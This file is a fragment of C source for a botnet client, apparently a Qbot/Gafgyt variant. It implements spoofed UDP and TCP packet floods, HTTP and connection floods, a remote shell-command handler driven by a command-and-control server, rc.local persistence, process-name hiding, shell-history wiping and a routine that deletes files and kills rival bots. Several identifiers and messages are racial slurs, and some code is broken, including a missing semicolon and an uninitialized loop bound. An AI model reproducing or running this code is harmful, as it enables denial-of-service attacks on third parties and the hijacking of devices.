sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

if(i == pollRegister)
{
if(port == 0) dest_addr.sin_port = rand_cmwc();
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
if(ii == sleepcheck)
{
usleep(sleeptime*1000);
ii = 0;
continue;
}
ii++;
}
} else {
int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
if(!sockfd)
{
sockprintf(mainCommSock, "Failed opening raw socket.");
return;
}

int tmp = 1;
if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
{
sockprintf(mainCommSock, "Failed setting raw headers mode.");
return;
}

int counter = 50;
while(counter--)
{
srand(time(NULL) ^ rand_cmwc());
init_rand(rand());
}

in_addr_t netmask;

if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
else netmask = ( ~((1 << (32 - spoofit)) - 1) );

unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
struct iphdr *iph = (struct iphdr *)packet;
struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( GetRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

udph->len = htons(sizeof(struct udphdr) + packetsize);
udph->source = rand_cmwc();
udph->dest = (port == 0 ? rand_cmwc() : htons(port));
udph->check = 0;

makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);

iph->check = csum ((unsigned short *) packet, iph->tot_len);

int end = time(NULL) + timeEnd;
register unsigned int i = 0;
register unsigned int ii = 0;
while(1)
{
sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

udph->source = rand_cmwc();
udph->dest = (port == 0 ? rand_cmwc() : htons(port));
iph->id = rand_cmwc();
iph->saddr = htonl( GetRandomIP(netmask) );
iph->check = csum ((unsigned short *) packet, iph->tot_len);

if(i == pollRegister)
{
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;

if(ii == sleepcheck)
{
usleep(sleeptime*1000);
ii = 0;
continue;
}
ii++;
}
}
}

void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
register unsigned int pollRegister;
pollRegister = pollinterval;

struct sockaddr_in dest_addr;

dest_addr.sin_family = AF_INET;
if(port == 0) dest_addr.sin_port = rand_cmwc();
else dest_addr.sin_port = htons(port);
if(getHost(target, &dest_addr.sin_addr)) return;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
if(!sockfd)
{
sockprintf(mainCommSock, "Failed opening raw socket.");
return;
}

int tmp = 1;
if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
{
sockprintf(mainCommSock, "Failed setting raw headers mode.");
return;
}

in_addr_t netmask;

if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
else netmask = ( ~((1 << (32 - spoofit)) - 1) );

unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
struct iphdr *iph = (struct iphdr *)packet;
struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( GetRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

tcph->source = rand_cmwc();
tcph->seq = rand_cmwc();
tcph->ack_seq = 0;
tcph->doff = 5;

if(!strcmp(flags, "all"))
{
tcph->syn = 1;
tcph->rst = 1;
tcph->fin = 1;
tcph->ack = 1;
tcph->psh = 1;
} else {
unsigned char *pch = strtok(flags, ",");
while(pch)
{
if(!strcmp(pch, "syn"))
{
tcph->syn = 1;
} else if(!strcmp(pch, "rst"))
{
tcph->rst = 1;
} else if(!strcmp(pch, "fin"))
{
tcph->fin = 1;
} else if(!strcmp(pch, "ack"))
{
tcph->ack = 1;
} else if(!strcmp(pch, "psh"))
{
tcph->psh = 1;
} else {
sockprintf(mainCommSock, "Invalid flag \"%s\"", pch);
}
pch = strtok(NULL, ",");
}
}

tcph->window = rand_cmwc();
tcph->check = 0;
tcph->urg_ptr = 0;
tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
tcph->check = tcpcsum(iph, tcph);

iph->check = csum ((unsigned short *) packet, iph->tot_len);

int end = time(NULL) + timeEnd;
register unsigned int i = 0;
while(1)
{
sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

iph->saddr = htonl( GetRandomIP(netmask) );
iph->id = rand_cmwc();
tcph->seq = rand_cmwc();
tcph->source = rand_cmwc();
tcph->check = 0;
tcph->check = tcpcsum(iph, tcph);
iph->check = csum ((unsigned short *) packet, iph->tot_len);

if(i == pollRegister)
{
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
}
}

void botkiller(){
char* Niggerdirs[] = {"/dev/netslink/", "/tmp/", "/var/", "/dev/", "/var/run/", "/dev/shm/", "/mnt/", "/boot/", "/usr/", (char*) 0};//wtf are we doing here well these are the directory
char hacker[80];
char botkill[80];
char buf[128];
int i, num_tmps, j;
for(j = 0; j < num_tmps; j++)
{
memset(buf, 0, 128);
if(j == 0)
snprintf(buf, 127, ">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\r\n", Niggerdirs[j], Niggerdirs[j], Niggerdirs[j], Niggerdirs[j], bots[j]);
else
snprintf(buf, 127, ">%s.t && cd %s ; >retrieve\r\n", Niggerdirs[j], Niggerdirs[j], Niggerdirs[j]);
system(buf);
sprintf(botkill, "pkill -9 %s\r\n", bots[j]);
system(botkill);
return;
}
sleep(5);
}
void ClearHistory()
{
system("history -c;history -w");
system("cd /root;rm -rf .bash_history");
system("cd /var/tmp; rm -f *");
}
void sendHTTP(void *host, char *method, in_port_t port, char *path, int timeFoo, int power) {
const char *connections[] = {"close", "keep-alive", "accept"};
int i, timeEnd = time(NULL) + timeFoo;
char request[512];
sprintf(request, "%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n", method, path, connections[(rand() % 30)], useragents[(rand() % 33)]);
for (i = 0; i < power; i++) {
if (fork()) {
while (timeEnd > time(NULL)) {
int socket = socket_connect((char *)host, port);
if (socket != 0) {
write(socket, request, strlen(request));
close(socket);
}
}
_exit(1);
}
}
}


void sendCNC(unsigned char *ip,int port, int end_time)
{
int end = time(NULL) + end_time;
int sockfd;
struct sockaddr_in server;
server.sin_addr.s_addr = inet_addr(ip);
server.sin_family = AF_INET;
server.sin_port = htons(port);
while(end > time(NULL))
{
sockfd = socket(AF_INET, SOCK_STREAM, 0);
connect(sockfd , (struct sockaddr *)&server , sizeof(server));
sleep(1);
close(sockfd);
}
}
void UpdateBins()
{
int pid;
if ( (pid = fork()) == 0) {
char update[1024];
snprintf(update, sizeof(update), "%s", infect);
system(update);
sleep(20);
} else {
printf("%d\n", pid);
}

return;
}

void processCmd(int argc, unsigned char *argv[])
{
if(!strcmp(argv[0], "PING"))
{
sockprintf(mainCommSock, "PONG!");
return;
}

if(!strcmp(argv[0], "TABLE"))
{
sockprintf(mainCommSock, "%d", getdtablesize());
return;
}

if(!strcmp(argv[0], "UPDATE"))
{
sockprintf(mainCommSock, "UPDATE TAKEN SUCCESFULLY");
UpdateBins();
return;
}

if(!strcmp(argv[0], "TELSCAN"))
{
if(!strcmp(argv[1], "OFF"))
{
if(scanPid == 0) return;
kill(scanPid, 9);
sockprintf(mainCommSock, "STOPPING SCANNER");
scanPid = 0;
}
if(!strcmp(argv[1], "ON"))
{
if(scanPid != 0) return;
uint32_t parent;
parent = fork();
int threads = 500;
int timeout = 60;
if (parent > 0) { scanPid = parent; return;}
else if(parent == -1) return;
StartTheLelz(threads, timeout);
_exit(0);
}
}

if(!strcmp(argv[0], "NIGGERKILL"))
{
if(!listFork())
{
botkiller();
_exit(0);
}
}

if(!strcmp(argv[0], "GETPUBLICIP"))
{
sockprintf(mainCommSock, "My Public IP: %s", inet_ntoa(ourIP));
return;
}

if(!strcmp(argv[0], "HOLD"))
{
if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
{
return;
}
unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
if(strstr(ip, ",") != NULL)
{
unsigned char *hi = strtok(ip, ",");
while(hi != NULL)
{
if(!listFork())
{
sendHOLD(hi, port, time);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (listFork()) { return; }
sendHOLD(ip, port, time);
_exit(0);
}
}
if(!strcmp(argv[0], "JUNK"))
{
if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
{
return;
}
unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
if(strstr(ip, ",") != NULL)
{
unsigned char *hi = strtok(ip, ",");
while(hi != NULL)
{
if(!listFork())
{
sendJUNK(hi, port, time);
close(mainCommSock);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (listFork()) { return; }
sendJUNK(ip, port, time);
_exit(0);
}
}

if(!strcmp(argv[0], "UDP"))
{
if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1))
{
return;
}

unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
int spoofed = atoi(argv[4]);
int packetsize = atoi(argv[5]);
int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);

if(strstr(ip, ",") != NULL)
{
unsigned char *hi = strtok(ip, ",");
while(hi != NULL)
{
if(!listFork())
{
sendUDP(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (!listFork()){
sendUDP(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
_exit(0);
}
}
return;
}

if(!strcmp(argv[0], "TCP"))
{
if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
{
return;
}

unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);
int spoofed = atoi(argv[4]);
unsigned char *flags = argv[5];

int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
int psize = argc > 6 ? atoi(argv[6]) : 0;

if(strstr(ip, ",") != NULL)
{
unsigned char *hi = strtok(ip, ",");
while(hi != NULL)
{
if(!listFork())
{
sendTCP(hi, port, time, spoofed, flags, psize, pollinterval);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (!listFork()) {
sendTCP(ip, port, time, spoofed, flags, psize, pollinterval);
_exit(0);
}
}
}
if (!strcmp((const char *)argv[0], "HTTP")) {
if (argc < 6)
{
return;
}

if (strstr((const char *)argv[1], ",") != NULL) {
unsigned char *hi = (unsigned char *)strtok((char *)argv[1], ",");
while (hi != NULL) {
if (!listFork()) {
sendHTTP((char*)argv[1], (char*)argv[2], atoi((char*)argv[3]), (char*)argv[4], atoi((char*)argv[5]), atoi((char*)argv[6]));
_exit(0);
}
hi = (unsigned char *)strtok(NULL, ",");
}
} else {
if (listFork()) {
return;
}
sendHTTP((char*)argv[1], (char*)argv[2], atoi((char*)argv[3]), (char*)argv[4], atoi((char*)argv[5]), atoi((char*)argv[6]));
_exit(0);
}
}

if(!strcmp(argv[0], "CNC"))
{
if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
{
return;
}

unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);

if(strstr(ip, ",") != NULL)
{
unsigned char *hi = strtok(ip, ",");
while(hi != NULL)
{
if(!listFork())
{
sendCNC(hi, port, time);
close(mainCommSock);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (listFork()) { return; }

sendCNC(ip, port, time);
_exit(0);
}
}

if(!strcmp(argv[0], "STD"))
{
if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
{
return;
}

unsigned char *ip = argv[1];
int port = atoi(argv[2]);
int time = atoi(argv[3]);

if(strstr(ip, ",") != NULL)
{
unsigned char *hi = strtok(ip, ",");
while(hi != NULL)
{
if(!listFork())
{
sendSTD(hi, port, time);
_exit(0);
}
hi = strtok(NULL, ",");
}
} else {
if (listFork()) { return; }

sendSTD(ip, port, time);
_exit(0);
}

}

if(!strcmp(argv[0], "STOPATTK"))
{
int killed = 0;
unsigned long i;
for (i = 0; i < numpids; i++) {
if (pids[i] != 0 && pids[i] != getpid()) {
kill(pids[i], 9);
killed++;
}
}

if(killed > 0)
{
sockprintf(mainCommSock, "Killed %d.", killed);
} else {
sockprintf(mainCommSock, "None Killed.");
}
}

if(!strcmp(argv[0], "KILLME"))
{
sockprintf(mainCommSock, "ima dup nigga");
exit(0);
}
}

int initConnection()
{
unsigned char server[4096];
memset(server, 0, 4096);
if(mainCommSock) { close(mainCommSock); mainCommSock = 0; }
if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
else currentServer++;
strcpy(server, TelnetNigger[currentServer]);
int port = Server_Botport;
mainCommSock = socket(AF_INET, SOCK_STREAM, 0);
if(!connectTimeout(mainCommSock, server, port, 30)) return 1;
return 0;
}

int getOurIP()
{
int sock = socket(AF_INET, SOCK_DGRAM, 0);
if(sock == -1) return 0;

struct sockaddr_in serv;
memset(&serv, 0, sizeof(serv));
serv.sin_family = AF_INET;
serv.sin_addr.s_addr = inet_addr("8.8.8.8");
serv.sin_port = htons(53);

int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
if(err == -1) return 0;

struct sockaddr_in name;
socklen_t namelen = sizeof(name);
err = getsockname(sock, (struct sockaddr*) &name, &namelen);
if(err == -1) return 0;

ourIP.s_addr = name.sin_addr.s_addr;

int cmdline = open("/proc/net/route", O_RDONLY);
char linebuf[4096];
while(fdgets(linebuf, 4096, cmdline) != NULL)
{
if(strstr(linebuf, "\t00000000\t") != NULL)
{
unsigned char *pos = linebuf;
while(*pos != '\t') pos++;
*pos = 0;
break;
}
memset(linebuf, 0, 4096);
}
close(cmdline);

if(*linebuf)
{
int i;
struct ifreq ifr;
strcpy(ifr.ifr_name, linebuf);
ioctl(sock, SIOCGIFHWADDR, &ifr);
for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
}

close(sock);
}
/*
MIPS
MIPSEL
SH4
x86_64
i586
i686
PPC
m68k
sparc
ARMv4
ARMv5
ARMv6
*/
char *getBuild() {
  #ifdef ARCH_MIPS
	return "MIPS";
  #endif
  #ifdef ARCH_MIPSEL
	return "MIPSEL";
  #endif
  #ifdef ARCH_SH4
    return "SH4";
  #endif
  #ifdef ARCH_X86_64
	return "x86_64";
  #endif
  #ifdef ARCH_I5
	return "i586";
  #endif
  #ifdef ARCH_I6
    return "i686";
  #endif
  #ifdef ARCH_PPC
	return "PPC";
  #endif
  #ifdef ARCH_M68K
    return "m68k";
  #endif
  #ifdef ARCH_SPARC
    return "sparc";
  #endif
  #ifdef ARCH_ARMv4
    return "ARMv4";
  #endif
  #ifdef ARCH_ARMv5
    return "ARMv5";
  #endif
  #ifdef ARCH_ARM6
    return "ARMv6";
  #endif
}

char *getType()
	{
        #ifdef ARCH_I6
            return "SERVER";
        #elif ARCH_X86_64
            return "SERVER";
        #elif ARCH_I5
            return "SERVER";
        #else
            return "ROUTER";
        #endif
	}
int main(int argc, unsigned char *argv[])
{
printf("peenis")
char *mynameis = "";
if(SERVER_LIST_SIZE <= 0) return 0;
strncpy(argv[0],"",strlen(argv[0]));
argv[0] = "";
prctl(PR_SET_NAME, (unsigned long) mynameis, 0, 0, 0);
srand(time(NULL) ^ getpid());
init_rand(time(NULL) ^ getpid());
pid_t pid1;
pid_t pid2;
int status;
int dupthing = 0;
char cwd[256],*str;
FILE *file;
str="/etc/rc.d/rc.local";
file=fopen(str,"r");
if (file == NULL) {
str="/etc/rc.conf";
file=fopen(str,"r");
}
if (file != NULL) {
char outfile[256], buf[1024];
int i=strlen(argv[0]), d=0;
getcwd(cwd,256);
if (strcmp(cwd,"/")) {
while(argv[0][i] != '/') i--;
sprintf(outfile,"\"%s%s\"\n",cwd,argv[0]+i);
while(!feof(file)) {
fgets(buf,1024,file);
if (!strcasecmp(buf,outfile)) d++;
}
if (d == 0) {
FILE *out;
fclose(file);
out=fopen(str,"a");
if (out != NULL) {
fputs(outfile,out);
fclose(out);
}
}
else fclose(file);
}
else fclose(file);
}

getOurIP();

if (pid1 = fork()) {
waitpid(pid1, &status, 0);
exit(0);
} else if (!pid1) {
if (pid2 = fork()) {
exit(0);
} else if (!pid2) {
} else {
zprintf("fork failed\n");
}
} else {
zprintf("fork failed\n");
}

setsid();
chdir("/");

signal(SIGPIPE, SIG_IGN);

while(1)
{
if(initConnection()) { sleep(5); continue; }
	int threads = 500;
	int timeout = 60;
	sockprintf(mainCommSock, "\x1b[1;30m|\x1b[1;37m\x1b[47mMODZ\x1b[40m\x1b[0m\x1b[1;30m| \x1b[0;35mConnected \x1b[43m%s\x1b[40m \x1b[43m%s\x1b[40m  \x1b[43m%s\x1b[40m  \x1b[43m%s\x1b[40m \x1b[39m", inet_ntoa(ourIP), getType(), getBuild(), VERSION);
  sockprintf(mainCommSock, "%s", getBuild());
	botkiller();
	char commBuf[4096];
	int got = 0;
	int i = 0;
while((got = recvLine(mainCommSock, commBuf, 4096)) != -1)
{
for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
unsigned int *newpids, on;
for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
pids[on - 1] = 0;
numpids--;
newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
for (on = 0; on < numpids; on++) newpids[on] = pids[on];
free(pids);
pids = newpids;
}

commBuf[got] = 0x00;

trim(commBuf);

if(strstr(commBuf, "PING") == commBuf)
{
sockprintf(mainCommSock, "PONG");
continue;
}
if(strstr(commBuf, "KILLME") == commBuf){
dupthing++;
zprintf("\n");
if(dupthing > 20){
exit(0);
}
break;
}

unsigned char *message = commBuf;

if(*message == '!')
{
unsigned char *nickMask = message + 1;
while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
if(*nickMask == 0x00) continue;
*(nickMask) = 0x00;
nickMask = message + 1;

message = message + strlen(nickMask) + 2;
while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

unsigned char *command = message;
while(*message != ' ' && *message != 0x00) message++;
*message = 0x00;
message++;

unsigned char *tmpcommand = command;
while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }

if(strcmp(command, "CMD") == 0)
{
unsigned char buf[1024];
int command;
if (listFork()) continue;
memset(buf, 0, 1024);
szprintf(buf, "%s 2>&1", message);
command = fdpopen(buf, "r");
while(fdgets(buf, 1024, command) != NULL)
{
trim(buf);
sockprintf(mainCommSock, "%s", buf);
memset(buf, 0, 1024);
sleep(1);
}
fdpclose(command);
exit(0);
}

unsigned char *params[10];
int paramsCount = 1;
unsigned char *pch = strtok(message, " ");
params[0] = command;

while(pch)
{
if(*pch != '\n')
{
params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
memset(params[paramsCount], 0, strlen(pch) + 1);
strcpy(params[paramsCount], pch);
paramsCount++;
}
pch = strtok(NULL, " ");
}

processCmd(paramsCount, params);

if(paramsCount > 1)
{
int q = 1;
for(q = 1; q < paramsCount; q++)
{
free(params[q]);
}
}
}
}
}

return 0;
printf("client exiting");
}